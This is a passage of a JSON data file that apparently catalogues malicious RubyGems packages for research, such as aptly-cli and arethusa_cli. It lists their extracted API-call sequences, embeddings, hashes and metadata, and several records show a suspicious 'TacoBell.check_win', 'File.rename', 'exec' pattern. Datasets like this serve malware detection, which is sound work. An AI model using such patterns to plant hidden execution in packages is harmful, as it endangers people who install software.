'setup_logger', '::URI.parse', 'Hash.[]', 'CGI.parse(parsed.query.to_s).map', 'CGI.parse', 'parsed.query.to_s', 'parsed.query', 'v.first', 'Integer', 'params.[]', 'app.config.lograge.enabled=', 'app.config.lograge', 'app.config', 'app.config.lograge.formatter=', 'app.config.lograge', 'app.config', 'Applicaster::Logger::Lograge::Formatter.new', 'app.config.lograge.custom_options=', 'app.config.lograge', 'app.config', 'lambda', 'event.payload.[](:params).except(*INTERNAL_PARAMS).inspect', 'event.payload.[](:params).except', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'app.config.applicaster_logger', 'app.config', 'app.config.logger=', 'app.config', 'new_logger', 'Applicaster::Logger::Sidekiq.setup', 'new_logger', 'Sidetiq.logger=', 'new_logger', 'Delayed::Worker.logger=', 'new_logger', '::Rails.application.config.applicaster_logger', '::Rails.application.config', '::Rails.application', 'LogStashLogger.new(config.logstash_config).tap', 'LogStashLogger.new', 'config.logstash_config', 'logger.level=', 'config.level', 'logger.formatter=', 'Applicaster::Logger::Formatter.new', 'default_fields.merge', 'default_fields', '::Rails.application.config.applicaster_logger', '::Rails.application.config', '::Rails.application', '{ application: config.application_name, environment: Rails.env.to_s }.merge', 'config.application_name', 'Rails.env.to_s', 'Rails.env', 'config.logzio_token', 'config.logzio_token', 'require_relative', 'require_relative', 'require_relative', 'require_relative', '::Sidekiq::Logging.logger=', '::Sidekiq.configure_server', 'config.error_handlers.delete_if', 'config.error_handlers', 'h.is_a?', '::Sidekiq.error_handlers.<<', '::Sidekiq.error_handlers', 'Applicaster::Logger::Sidekiq::ExceptionLogger.new', 'config.server_middleware', 'chain.prepend', 'Gem::Version.new(::Sidekiq::VERSION).<', 'Gem::Version.new', 'Gem::Version.new', 'require', 'config.server_middleware', 'chain.remove', 'chain.add', '::Sidekiq.options.[]=', '::Sidekiq.options', 'item.[]', '::Process.pid', '::Thread.current.object_id.to_s', '::Thread.current.object_id', '::Thread.current', 'item.[]', '(item.[](\"wrapped\") || item.[](\"class\"))\\n.to_s', 'item.[]', 'item.[]', 'item.[](\"args\").inspect', 'item.[]', '::Sidekiq.logger', '(item.[](\"wrapped\") || item.[](\"class\"))\\n.to_s', 'item.[]', 'item.[]', 'include', 'item_class_name', 'item.[]', '::Sidekiq::Job.new(item).latency', '::Sidekiq::Job.new', 'item_class_name', 'item.[]', 'opts.fetch', 'opts.fetch', 'item_class_name', 'item.[]', 'exception.class.to_s', 'exception.class', 'Applicaster::Logger.truncate_bytes', 'exception.message.to_s', 'exception.message', 'require_relative', 'include', 'include', 'ctxHash.[]', 'item.[]', 'logger.error', 'logger', 'job_context(item, queue).deep_merge', 'job_context', 'exception_event', 'require_relative', 'include', 'include', 'Time.now', 'logger.info', 'logger', 'job_context(item, queue).deep_merge', 'job_context', 'start_event', 'elapsed', 'logger.info', 'logger', 'job_context(item, queue).deep_merge', 'job_context', 'done_event', 'private', '(Time.now - start)\\n.round', 'Time.now.-', 'Time.now', 'require_relative', 'include', 'include', 'logger.info', 'logger', 'start_event', 'Time.now', 'elapsed', 'logger.info', 'logger', 'done_event', 'logger.error', 'logger', 'exception_event', 'raise', 'private', 'start.nil?', '(Time.now - start).to_f.round', '(Time.now - start)\\n.to_f', 'Time.now.-', 'Time.now', 'include', 'Applicaster::Logger::ThreadContext.add', 'job_context', 'Applicaster::Logger::ThreadContext.clear!', 'module_function', 'self.name.to_sym', 'self.name', 'Thread.current.[]', 'Thread.current', 'HashWithIndifferentAccess.new', 'current.merge!', 'current', 'Thread.current.[]=', 'Thread.current', 'HashWithIndifferentAccess.new']",
            "n_tokens": 1720,
            "embedding": "[ 0.00414641 -0.02299698 -0.00745925 ...  0.00395826 -0.02162516\n  0.00432265]",
            "cluster": "0",
            "id": 490,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/applicaster_logger/0.8.4/applicaster_logger-0.8.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/applicaster_logger/0.8.4/applicaster_logger-0.8.4_extracted",
            "name": "applicaster_logger",
            "version": "0.8.4",
            "published_at": "2020-02-16T05:32:25.994Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, logstash-logger, lograge",
            "SHA-256": "716237aab946a45446f006a83d425d337ccc56695f67af31cae7a5628bebfabd"
        },
        {
            "name_version": "aptly-cli-0.5.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aptly-cli/0.5.0/aptly-cli-0.5.0_extracted/aptly-cli-0.5.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'Dir.[](File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/aptly-cli/0.5.0/aptly-cli-0.5.0_extracted/aptly-cli-0.5.0_sourcecode.rb\") + \"/*.rb\").each', 'Dir.[]', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/aptly-cli/0.5.0/aptly-cli-0.5.0_extracted/aptly-cli-0.5.0_sourcecode.rb\").+', 'File.dirname', 'require', '\"0.5.0\".freeze', 'include', 'attr_accessor', 'Options.new', 'options.server', '@config.[]=', 'options.server', 'options.port', '@config.[]=', 'options.port', 'options.username', '@config.[]=', 'options.username', 'options.password', '@config.[]=', 'options.password', 'options.debug', '@config.[]=', 'options.debug', '@config.each', 'v.==', '@config.[]=', 'k.to_sym', 'ask', 'v.==', '@config.[]=', 'k.to_sym', 'password', 'v.==', 'require', 'Keyring.new', '\"Aptly API server at \" + @config.[](:server) + \":\".+', '\"Aptly API server at \" + @config.[](:server).+', '\"Aptly API server at \".+', '@config.[]', '@config.[](:port).to_s', '@config.[]', 'keyring.get_password', '@config.[]', 'password', 'keyring.set_password', '@config.[]', '@config.[]=', 'k.to_sym', '@config.[]', '@config.[]', '@config.[]', 'self.class.base_uri', 'self.class', '@config.[]', '@config.[]', 'self.class.basic_auth', 'self.class', '@config.[](:username).to_s', '@config.[]', '@config.[](:password).to_s', '@config.[]', 'self.class.debug_output', 'self.class', '@config.[]', 'require', 'require', 'require', 'require', 'attr_accessor', 'self.class.get', 'self.class', 'response.parsed_response', 'file_uri.==', '\"/files/\".+', 'self.class.get', 'self.class', 'response.parsed_response', '\"/files\".+', 'self.class.delete', 'self.class', 'response.parsed_response', '\"/files\".+', 'post_options.[](:file_uri).to_s', 'post_options.[]', 'self.class.post', 'self.class', 'post_options.[]', 'File.new', 'post_options.[]', 'response.parsed_response', 'require', 'require', 'require', 'Logger.new', '@log.level=', '@config.keys.+', '@config.keys', 'opts.each', '@valid_config_keys.include?', 'k.to_sym', 'config.[]=', 'config', 'k.to_sym', 'YAML.load', 'IO.read', '@log.warn', '@log.warn', 'configure', 'require', 'require', 'require', 'require', 'require', 'include', 'self.class.get', 'self.class', 'self.class.get', 'self.class', 'response.parsed_response', 'require', 'require', 'require', 'require', 'require', 'include', 'self.class.get', 'self.class', 'require', 'require', 'require', 'require', 'require', 'include', 'publish_options.[]', 'publish_options.[]', 'publish_options.[]', 'publish_options.[](:force).==', 'publish_options.[]', 'self.class.delete', 'self.class', 'self.class.get', 'self.class', 'names.each_pair', 'snapshots_to_publish.<<', 'v.to_s', 'k.to_s', 'names.is_a?', 'names.each', 'k.include?', 'k.split', 'repos_to_publish.<<', 'label_type.to_s', 'repos_to_publish.<<', 'label_type.to_s', 'available_gpg_options.each', 'publish_options.key?', 'publish_options.[](option).nil?', 'publish_options.[]', 'gpg_options.merge!', 'option.capitalize.to_s', 'option.capitalize', 'publish_options.[]', 'available_options_for_func.each', 'publish_options.key?', 'body.[]=', 'option.capitalize', 'publish_options.[]', '_parse_names', 'parse_gpg_options', '@body.[]=', 'publish_options.[]', '@body.[]=', 'build_body', 'gpg_options.empty?', '@body.[]=', 'publish_options.[]', 'publish_options.[]', '@body.to_json', 'self.class.post', 'self.class', 'parse_gpg_options', 'publish_options.[](:snapshots).nil?', 'publish_options.[]', '@body.[]=', '_parse_snapshots', 'publish_options.[]', 'gpg_options.empty?', '@body.[]=', 'build_body', 'publish_options.[]', 'publish_options.[]', 'publish_options.[]', '@body.to_json', 'self.class.put', 'self.class', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'repo_options.[]', 'repo_options.[]', 'repo_options.[]', 'repo_options.[]', 'self.class.post', 'self.class', '{ \"Name\" => name, \"Comment\" => comment, \"DefaultDistribution\" => default_distribution, \"DefaultComponent\" => default_component }.to_json', '\"/repos/\".+', 'repo_options.[]', 'repo_options.[](:force).==', 'repo_options.[]', 'self.class.delete', 'self.class', 'k', 'v', 'name.nil?', '\"/repos/\".+', 'repo_options.each', 'self.class.put', 'self.class', '{ repo_option => repo_value }.to_json', 'self.class.get', 'self.class', 'repo_options.is_a?(Hash).!', 'repo_options.is_a?', 'repo_options.[](:name).nil?', 'repo_options.[]', 'raise', 'ArgumentError.new', '\"/repos/\" + repo_options.[](:name).+', '\"/repos/\".+', 'repo_options.[]', 'self.class.post', 'self.class', '{ PackageRefs: packages }.to_json', 'repo_options.is_a?(Hash).!', 'repo_options.is_a?', 'repo_options.[](:name).nil?', 'repo_options.[]', 'raise', 'ArgumentError.new', '\"/repos/\" + repo_options.[](:name).+', '\"/repos/\".+', 'repo_options.[]', 'self.class.delete', 'self.class', '{ PackageRefs: packages }.to_json', 'repo_options.[](:name).nil?', 'repo_options.[]', 'raise', 'ArgumentError.new', '\"/repos/\" + repo_options.[](:name).+', '\"/repos/\".+', 'repo_options.[]', 'repo_options.[]', 'qs_hash.[]=', 'repo_options.[]', 'repo_options.[]', 'qs_hash.[]=', 'repo_options.[]', 'repo_options.[]', 'qs_hash.[]=', '\"?\".+', 'URI.encode_www_form', 'self.class.get', 'self.class', 'name.nil?', '\"/repos/\".+', 'self.class.get', 'self.class', 'repo_options.[]', 'repo_options.[]', 'repo_options.[]', 'repo_options.[]', 'repo_options.[]', 'file.nil?', 'forcereplace.==', 'noremove.==', 'self.class.post', 'self.class', 'response.code', 'puts', 'JSON.parse', 'response.body', 'json_response.[](\"FailedFiles\").empty?', 'json_response.[]', 'puts', 'json_response.[]', 'json_response.[](\"Report\").[](\"Warnings\").empty?', 'json_response.[](\"Report\").[]', 'json_response.[]', 'puts', 'json_response.[](\"Report\").[]', 'json_response.[]', 'require', 'require', 'require', 'require', 'require', 'include', 'force.==', 'self.class.delete', 'self.class', 'self.class.get', 'self.class', '\"/repos/#{repo}/\".+', 'self.class.post', 'self.class', '{ \"Name\" => name, \"Description\" => description }.to_json', 'self.class.post', 'self.class', '{ \"Name\" => name, \"Description\" => description, \"SourceSnapshots\" => sourcesnapshots, \"PackageRefs\" => packagerefs }.to_json', 'self.class.get', 'self.class', 'search_options.key?', '@options.[]=', 'search_options.[](:format).to_s', 'search_options.[]', 'search_options.key?', '@options.[]=', 'search_options.[]', 'search_options.[](:withDeps).==', 'search_options.[]', '@options.[]=', 'self.class.get', 'self.class', 'self.class.get', 'self.class', 'new_name.nil?', '@query.[]=', 'description.nil?', '@query.[]=', '@query.to_json', 'self.class.put', 'self.class', 'puts']",
            "n_tokens": 2008,
            "embedding": "[-0.01036398 -0.00273144 -0.00214907 ... -0.02384685 -0.01327946\n  0.02390497]",
            "cluster": "0",
            "id": 408,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aptly-cli/0.5.0/aptly-cli-0.5.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aptly-cli/0.5.0/aptly-cli-0.5.0_extracted",
            "name": "aptly-cli",
            "version": "0.5.0",
            "published_at": "2020-02-16T05:40:36.075Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, minitest, coveralls, simplecov, rubocop, httparty, commander",
            "SHA-256": "eddc26c062db2a0350ed86e2fcffe3063073103b6c340eec90880244f5c8d039"
        },
        {
            "name_version": "arethusa_cli-0.1.16",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/arethusa_cli/0.1.16/arethusa_cli-0.1.16_extracted/arethusa_cli-0.1.16_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'File.join', 'File.dirname', 'register', 'Generator.namespace', 'Generator.namespace', 'register', 'Transformer.namespace', 'Transformer.namespace', 'desc', 'method_option', 'options.[]', 'options', 'minify', 'empty_directory', 'tar_name', 'ending', 'create_tgz', 'say_status', 'archive_path', 'desc', 'long_desc', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'options.[]', 'options', 'File.join(directory, short_sha).strip', 'File.join', 'short_sha', 'options.[]', 'options', 'options.[]', 'options', 'options.[]', 'options', 'options.[]', 'options', '@address.split(\"@\").first', '@address.split', 'options.[]', 'options', 'options.[](:minify).&', 'options.[]', 'options', '@archive.!', 'minify', 'create_deploy_directory', 'execute', 'use_deployment_helper', 'say_status', 'desc', 'method_option', 'method_option', 'read_conf', 'options.[]', 'options', 'config_dir', 'traverse_and_include', 'options.[]', 'options', 'puts', '@conf.to_json', 'puts', 'JSON.pretty_generate', 'desc', 'inside', 'namespaced_name', 'init_git', 'create_folder_hierarchy', 'create_templates', 'initial_commit', 'install', 'no_commands', 'include', 'include', 'say_status', 'namespaced_name', 'plugin_dir', 'template_dir', 'template_dir', 'css_dir', 'conf_dir', 'dist_dir', 'dist_dir', 'dirs.each', 'empty_directory', 'create_module', 'create_service', 'create_html_template', 'create_spec', 'create_scss', 'create_gitignore', 'create_jshintrc', 'create_package', 'create_bower', 'create_gruntfile', 'create_index_file', 'create_conf_file', 'inside', 'system', 'say_status', 'say_status', 'exit', 'ssh', 'ssh', 'archive_to_use', 'ssh', 'decompress', 'ssh', 'folders_to_deploy.join', 'folders_to_deploy', 'compress', 'archive_path', 'folders_to_deploy.join', 'folders_to_deploy', '[tar_namespace, timestamp, git_branch, commit_sha].join', 'tar_namespace', 'timestamp', 'git_branch', 'commit_sha', '`git rev-parse --abbrev-ref HEAD`.strip', 'Time.now.to_i', 'Time.now', '`git rev-parse --short HEAD`.strip', 'inside', 'traverse', 'conf.clone', 'clone.each', 'value.is_a?', 'traverse', 'conf.[]', 'key.==', 'read_conf', 'conf.delete', 'conf.merge!', 'traverse', 'JSON.parse', 'File.read', 'require', 'as_subcommand', 'File.dirname', 'include', 'desc', 'method_option', 'method_option', 'options.[]', 'options', 'create_directories', 'create_files', 'try', 'try', 'options.[]', 'options', 'commit_changes', 'puts', 'say_status', 'namespaced_name', 'desc', 'method_option', 'method_option', 'options.[]', 'options', 'empty_directory', 'spec_dir', 'create_spec', 'options.[]', 'options', 'commit_changes', 'say_status', 'namespaced_name', 'desc', 'create_retriever', 'create_retriever_spec', 'no_commands', 'include', 'include', 'puts', 'say_status', 'send', 'DIRECTORIES.each', 'empty_directory', 'send', 'create_module', 'create_service', 'create_html_template', 'insert_into_file', 'gruntfile', 'namespaced_name', 'File.join', 'destination_root', 'insert_into_file', 'index_file', 'namespaced_name', 'File.join', 'destination_root', 'name', 'name', 'name', 'html_template_file.slice', 'html_template_file', 'puts', 'text.lines.map { |line,|\\n  \"\\\\t#{line}\"\\n}.join', 'text.lines.map', 'text.lines', 'namespaced_name', '`git rev-parse --short HEAD`.chomp', 'puts', 'say_status', 'File.join', 'File.expand_path', 'File.join', 'js_dir', 'namespaced_name', 'File.join', 'temp_dir', 'namespaced_name', 'template_dir', 'name', 'File.join', 'destination_root', 'File.join', 'destination_root', 'File.join', 'destination_root', 'mod', 'namespaced_name', 'File.join', 'destination_root', 'File.join', 'destination_root', 'File.join', 'destination_root', 'template', 'template_path', 'js_dir', 'namespaced_name', 'template', 'template_path', 'plugin_dir', 'name', 'template', 'template_path', 'html_template_file', 'template', 'template_path', 'spec_dir', 'name', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'css_dir', 'namespaced_name', 'template', 'template_path', 'template', 'template_path', 'conf_dir', 'template', 'template_path', 'js_dir', 'File.join', 'mod', 'name', 'template', 'template_path', 'spec_dir', 'name', 'namespace', '@namespace.==', '[ns, name(js)].compact.join', '[ns, name(js)].compact', 'name', 'to_camelcase', 'to_camelcase', 'to_camelcase', 'str.split', 'parts.shift', 'first.capitalize!', 'parts.map(&:capitalize).join', 'parts.map', 'namespace', 'basename', 'command.usage', 'require', 'require', 'as_subcommand', 'desc', 'Nokogiri.XML', 'open', 'Relations.new', 'parse', 'parse', 'puts', 'JSON.pretty_generate', 'no_commands', '@doc.xpath(\"//xmlns:table[@type = \\'#{type}\\']/xmlns:entry\").each', '@doc.xpath', 'entry.xpath(\"./xmlns:tb\").text', 'entry.xpath', 'short.==', 'short.empty?', 'entry.xpath(\"./xmlns:menu\").text', 'entry.xpath', '@conf.send', 'stripped', 'stripped', 'str.sub', '@labels.[]=', 'Relation.new', '@suffixes.[]=', 'Relation.new', 'hsh.to_json', '{ short: @short, long: @long }.to_json', 'require', 'describe', 'it', 'expect(Arethusa::CLI::VERSION).not_to', 'expect', 'be', 'require', 'require', 'Coveralls.wear!', 'SimpleCov.formatter=', 'SimpleCov::Formatter::MultiFormatter.[]', 'SimpleCov.start', 'add_filter', '$LOAD_PATH.unshift', 'File.expand_path', 'require', 'RSpec.configure', 'config.treat_symbols_as_metadata_keys_with_true_values=', 'config.run_all_when_everything_filtered=', 'config.filter_run']",
            "n_tokens": 1602,
            "embedding": "[-0.00039576  0.0033889  -0.00570837 ... -0.00241328 -0.01151993\n  0.01941877]",
            "cluster": "0",
            "id": 431,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/arethusa_cli/0.1.16/arethusa_cli-0.1.16.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/arethusa_cli/0.1.16/arethusa_cli-0.1.16_extracted",
            "name": "arethusa_cli",
            "version": "0.1.16",
            "published_at": "2020-02-16T05:50:46.339Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, rspec, simplecov, thor, nokogiri",
            "SHA-256": "cef767d51b1d7167f12854fdf0a518c08771de71481eadd55ed26b4bec5e642b"
        },
        {
            "name_version": "arethusa_client-0.1.17",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/arethusa_client/0.1.17/arethusa_client-0.1.17_extracted/arethusa_client-0.1.17_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'File.join', 'File.dirname', 'register', 'Generator.namespace', 'Generator.namespace', 'register', 'Transformer.namespace', 'Transformer.namespace', 'desc', 'method_option', 'options.[]', 'options', 'minify', 'empty_directory', 'tar_name', 'ending', 'create_tgz', 'say_status', 'archive_path', 'desc', 'puts', 'desc', 'long_desc', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'options.[]', 'options', 'File.join(directory, short_sha).strip', 'File.join', 'short_sha', 'options.[]', 'options', 'options.[]', 'options', 'options.[]', 'options', 'options.[]', 'options', '@address.split(\"@\").first', '@address.split', 'options.[]', 'options', 'options.[](:minify).&', 'options.[]', 'options', '@archive.!', 'minify', 'create_deploy_directory', 'execute', 'use_deployment_helper', 'say_status', 'desc', 'method_option', 'method_option', 'read_conf', 'options.[]', 'options', 'config_dir', 'traverse_and_include', 'options.[]', 'options', 'puts', '@conf.to_json', 'puts', 'JSON.pretty_generate', 'desc', 'inside', 'namespaced_name', 'init_git', 'create_folder_hierarchy', 'create_templates', 'initial_commit', 'install', 'no_commands', 'include', 'include', 'say_status', 'namespaced_name', 'plugin_dir', 'template_dir', 'template_dir', 'css_dir', 'conf_dir', 'dist_dir', 'dist_dir', 'dirs.each', 'empty_directory', 'create_module', 'create_service', 'create_html_template', 'create_spec', 'create_scss', 'create_gitignore', 'create_jshintrc', 'create_package', 'create_bower', 'create_gruntfile', 'create_index_file', 'create_conf_file', 'inside', 'system', 'say_status', 'say_status', 'exit', 'ssh', 'ssh', 'archive_to_use', 'ssh', 'decompress', 'ssh', 'folders_to_deploy.join', 'folders_to_deploy', 'compress', 'archive_path', 'folders_to_deploy.join', 'folders_to_deploy', '[tar_namespace, timestamp, git_branch, commit_sha].join', 'tar_namespace', 'timestamp', 'git_branch', 'commit_sha', '`git rev-parse --abbrev-ref HEAD`.strip', 'Time.now.to_i', 'Time.now', '`git rev-parse --short HEAD`.strip', 'inside', 'traverse', 'conf.clone', 'clone.each', 'value.is_a?', 'traverse', 'conf.[]', 'key.==', 'read_conf', 'conf.delete', 'traverse', 'conf.merge!', 'JSON.parse', 'File.read', 'require', 'as_subcommand', 'File.dirname', 'include', 'desc', 'method_option', 'method_option', 'options.[]', 'options', 'create_directories', 'create_files', 'try', 'try', 'options.[]', 'options', 'commit_changes', 'puts', 'say_status', 'namespaced_name', 'desc', 'method_option', 'method_option', 'options.[]', 'options', 'empty_directory', 'spec_dir', 'create_spec', 'options.[]', 'options', 'commit_changes', 'say_status', 'namespaced_name', 'desc', 'create_retriever', 'create_retriever_spec', 'no_commands', 'include', 'include', 'puts', 'say_status', 'send', 'DIRECTORIES.each', 'empty_directory', 'send', 'create_module', 'create_service', 'create_html_template', 'insert_into_file', 'gruntfile', 'namespaced_name', 'File.join', 'destination_root', 'insert_into_file', 'index_file', 'namespaced_name', 'File.join', 'destination_root', 'name', 'name', 'name', 'html_template_file.slice', 'html_template_file', 'puts', 'text.lines.map { |line,|\\n  \"\\\\t#{line}\"\\n}.join', 'text.lines.map', 'text.lines', 'namespaced_name', '`git rev-parse --short HEAD`.chomp', 'puts', 'say_status', 'File.join', 'File.expand_path', 'File.join', 'js_dir', 'namespaced_name', 'File.join', 'temp_dir', 'namespaced_name', 'template_dir', 'name', 'File.join', 'destination_root', 'File.join', 'destination_root', 'File.join', 'destination_root', 'mod', 'namespaced_name', 'File.join', 'destination_root', 'File.join', 'destination_root', 'File.join', 'destination_root', 'template', 'template_path', 'js_dir', 'namespaced_name', 'template', 'template_path', 'plugin_dir', 'name', 'template', 'template_path', 'html_template_file', 'template', 'template_path', 'spec_dir', 'name', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'template', 'template_path', 'css_dir', 'namespaced_name', 'template', 'template_path', 'template', 'template_path', 'conf_dir', 'template', 'template_path', 'js_dir', 'File.join', 'mod', 'name', 'template', 'template_path', 'spec_dir', 'name', 'namespace', '@namespace.==', '[ns, name(js)].compact.join', '[ns, name(js)].compact', 'name', 'to_camelcase', 'to_camelcase', 'to_camelcase', 'str.split', 'parts.shift', 'first.capitalize!', 'parts.map(&:capitalize).join', 'parts.map', 'namespace', 'basename', 'command.usage', 'require', 'require', 'as_subcommand', 'desc', 'Nokogiri.XML', 'open', 'Relations.new', 'parse', 'parse', 'puts', 'JSON.pretty_generate', 'no_commands', '@doc.xpath(\"//xmlns:table[@type = \\'#{type}\\']/xmlns:entry\").each', '@doc.xpath', 'entry.xpath(\"./xmlns:tb\").text', 'entry.xpath', 'short.==', 'short.empty?', 'entry.xpath(\"./xmlns:menu\").text', 'entry.xpath', '@conf.send', 'stripped', 'stripped', 'str.sub', '@labels.[]=', 'Relation.new', '@suffixes.[]=', 'Relation.new', 'hsh.to_json', '{ short: @short, long: @long }.to_json', 'require', 'describe', 'it', 'expect(Arethusa::CLI::VERSION).not_to', 'expect', 'be', 'require', 'require', 'Coveralls.wear!', 'SimpleCov.formatter=', 'SimpleCov::Formatter::MultiFormatter.[]', 'SimpleCov.start', 'add_filter', '$LOAD_PATH.unshift', 'File.expand_path', 'require', 'RSpec.configure', 'config.treat_symbols_as_metadata_keys_with_true_values=', 'config.run_all_when_everything_filtered=', 'config.filter_run']",
            "n_tokens": 1608,
            "embedding": "[-0.00040208  0.00365136 -0.00568147 ... -0.00208179 -0.0109024\n  0.01883483]",
            "cluster": "0",
            "id": 661,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/arethusa_client/0.1.17/arethusa_client-0.1.17.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/arethusa_client/0.1.17/arethusa_client-0.1.17_extracted",
            "name": "arethusa_client",
            "version": "0.1.17",
            "published_at": "2020-02-16T05:51:15.297Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, rspec, simplecov, thor, nokogiri",
            "SHA-256": "a96f9044d7fa8651dc81a293c3dc6dfa627ee1e06823890a57249f44f372f342"
        },
        {
            "name_version": "asana_cli-0.0.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asana_cli/0.0.2/asana_cli-0.0.2_extracted/asana_cli-0.0.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'Asana::Task.find', 'opts.[]', 'opts', 'task.create_story', 'opts.[]', 'opts', 'task.modify', 'puts', '\"Task %s closed!\".light_green.%', '\"Task %s closed!\".light_green', 'Asana::Task.find', 'task.create_story', 'resolve', 'projects.empty?', 'raise', 'CLIError.new', 'projects.each', 'puts', 'puts', '\"%s\\\\t Tasks\".%', 'project.name.light_green', 'project.name', 'puts', '(\"-\" * 60)\\n.light_white', '\"-\".*', 'project.tasks.each', 'project.tasks', 'puts', '\"%s\\\\t%s\".%', 'task.id.to_s.light_yellow', 'task.id.to_s', 'task.id', 'task.name.light_white', 'task.name', 'puts', 'resolve', 'workspaces.empty?', 'raise', 'CLIError.new', 'workspaces.each', 'puts', 'puts', '\"%s\\\\tProjects\".%', 'workspace.name.light_green', 'workspace.name', 'puts', '(\"-\" * 60)\\n.light_white', '\"-\".*', 'workspace.projects.each', 'workspace.projects', 'puts', '\"%s\\\\t%s\".%', 'project.id.to_s.light_yellow', 'project.id.to_s', 'project.id', 'project.name.light_white', 'project.name', 'puts', 'puts', 'puts', '\"Workspaces\".light_green', 'puts', '(\"-\" * 60)\\n.light_white', '\"-\".*', 'Asana::Workspace.all.each', 'Asana::Workspace.all', 'puts', '\"%s\\\\t%s\".%', 'workspace.id.to_s.light_yellow', 'workspace.id.to_s', 'workspace.id', 'workspace.name.light_white', 'workspace.name', 'resolve', 'tasks.each', 'puts', 'task.name.light_green', 'task.name', 'puts', '\"-\".*', 'task.attributes.each', 'task.attributes', 'val.is_a?', 'val.map', 'v.respond_to?', 'v.name', 'v.inspect', 'val.is_a?', 'val.is_a?', 'val.name', 'vals.is_a?', 'vals.join', 'puts', '\"%20s\\\\t%s\".%', 'vals.to_s.light_white', 'vals.to_s', 'puts', 'w.match', 'w.to_i', 'p.match', 'p.to_i', 't.match', 't.to_i', 'Asana::Task.find', 'Asana::Project.find(p_id).tasks.select', 'Asana::Project.find(p_id).tasks', 'Asana::Project.find', '_t.name.downcase.[]', '_t.name.downcase', '_t.name', 't.downcase', 'Asana::Workspace.find(w_id).projects', 'Asana::Workspace.find', 'Asana::Workspace.all.flat_map', 'Asana::Workspace.all', 'projects.select', '_p.name.downcase.[]', '_p.name.downcase', '_p.name', 'p.downcase', 'projects.flat_map', 'puts', 'project.name', 'project.tasks.select', 'project.tasks', '_t.name.downcase.[]', '_t.name.downcase', '_t.name', 't.downcase', 'Asana::Project.find', 'Asana::Workspace.find(w_id).projects', 'Asana::Workspace.find', 'Asana::Workspace.all.flat_map', 'Asana::Workspace.all', 'projects.select', '_p.name.downcase.[]', '_p.name.downcase', '_p.name', 'p.downcase', 'Asana::Workspace.find', 'Asana::Workspace.all.select', 'Asana::Workspace.all', '_w.name.downcase.[]', '_w.name.downcase', '_w.name', 'w.downcase']",
            "n_tokens": 820,
            "embedding": "[ 0.00052014  0.0037089  -0.00575976 ...  0.01386727 -0.02981737\n  0.01412306]",
            "cluster": "0",
            "id": 805,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asana_cli/0.0.2/asana_cli-0.0.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asana_cli/0.0.2/asana_cli-0.0.2_extracted",
            "name": "asana_cli",
            "version": "0.0.2",
            "published_at": "2020-02-16T05:56:04.874Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "trollop, asana, colorize",
            "SHA-256": "26577400ef7d2e8be5464b138446a5020f572e84176ba8009d8bb95f4bf61cd5"
        },
        {
            "name_version": "asciidoctor_pdf-linewrap-ja-0.6.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/asciidoctor_pdf-linewrap-ja/0.6.0/asciidoctor_pdf-linewrap-ja-0.6.0_extracted/asciidoctor_pdf-linewrap-ja-0.6.0_sourcecode.rb",
